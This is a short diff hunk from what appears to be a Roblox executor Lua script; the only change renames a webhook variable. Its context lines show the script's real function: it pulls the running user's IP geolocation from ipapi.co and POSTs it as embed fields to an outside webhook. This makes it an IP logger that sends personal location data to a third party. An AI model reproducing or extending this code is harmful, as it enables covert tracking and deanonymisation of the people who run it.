@@ -10,7 +10,7 @@ local ipGeoData =  httpService:JSONDecode(game:HttpGet('https://ipapi.co/json/')
 local function addField(name, value) return { name = name, value = value or 'Not found' } end
 
 request({
-	Url = getgenv().WebHook_URL,
+	Url = getgenv().Webhook_URL,
 	Method = 'POST',
 	Body = httpService:JSONEncode({
 		embeds = {
